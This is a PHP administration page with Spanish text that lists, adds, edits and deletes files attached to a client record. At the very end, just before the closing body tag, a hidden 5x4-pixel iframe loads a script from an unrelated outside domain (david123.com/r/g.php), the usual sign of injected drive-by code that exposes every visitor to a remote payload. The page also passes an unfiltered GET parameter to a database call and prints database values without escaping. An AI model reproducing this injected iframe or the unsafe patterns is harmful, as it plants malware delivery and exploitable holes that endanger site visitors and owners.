<?
	if (isset($_GET["id_cliente"])){
		$Sql_result = $ManCli->GetCliente($_GET["id_cliente"]);
			
		$row = mysql_fetch_array($Sql_result);

		$id_cliente			= $row['id'];
		$cliente			= $row['cliente'];
			
		$Archivos = $ManCli->ListArchivos($id_cliente);
		$total_archivos = $SqlSrv->dbNumRows($Archivos);
	}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> .:: TBX | Admin ::. </TITLE>

<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../styles/styles.css">

<!-- ADMNINISTRACION -->
<script language="javascript" src="../javascript/m_clientes.js"></script>

</HEAD>

<BODY>


			<!-- LISTADO -->
			<table cellpadding=0 cellspacing=0 border=0 class="marco_blanco">
				<tr> 
					<td>
					<!-- LISTADO DE SECCIONES -->
					<table cellpadding=2 cellspacing=0 border=0 width="100%">
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr>
							<td class="txt"><img src="../img/fl.gif" width="5" height="9" hspace="5">Desde aquí puede editar y agregar nuevos archivos a este cliente.</td>
							<td align="right"><input type="button" value="volver" class="actionButton" onclick="self.location='clientes.php';"></td>
						</tr>
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr>
							<td class="txt"><B><?=$cliente?></B></td>
							<td valign="bottom" align="right"><input type="button" class="actionButton" value="Agregar" onclick="AddArchivo('<?=$id_cliente?>')"></td>
						</tr>
						<tr> 
							<td colspan="2"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					<table border="0" cellpadding="2" cellspacing="0" width="100%">
						<tr>
							<td width="15"></td>
							<td class=txt>[ <A HREF="javascript:OrderBy('nombre')" class="txtLink">Nombre</A> ]</td>
							<td class=txt>[ <A HREF="javascript:OrderBy('archivo')" class="txtLink">Archivo</A> ]</td>
							<td></td>
						</tr>
					<?
						if ($total_archivos>0){

						for ($i=0; $i<$total_archivos; $i++) {
							$row = mysql_fetch_array($Archivos);
							
							$id			= $row['id'];
							$nombre		= $row['nombre'];
							$archivo	= $row['archivo'];
							$img_chica	= $row['img_chica'];

					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						 <tr>
							<td valign=top align=center><img src="../img/fl.gif" width=5 height=9 vspace=5></td>
							<td class="sub"><?=$nombre?></td>
							<td class="txt"><A HREF="<?=$imagePathArc.$img_chica?>" target="_blank">ver archivo</A></td>
							<td width="1%" align="right"><input type="button" class="actionButton" value="Editar" onclick="EditArchivo(<?=$id?>)">&nbsp;<input type="button" class="actionButton" value="Borrar" onclick="DelArchivo('<?=$id?>', '<?=$id_cliente?>')"></td>
						</tr>
					<?
						}
						} else {
					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
						<tr>
							<td colspan="4" class="txt" align="center">No se encontraron registros</td>
						</tr>
					<?
						}
					?>
						<tr> 
							<td colspan="4"><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
			

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
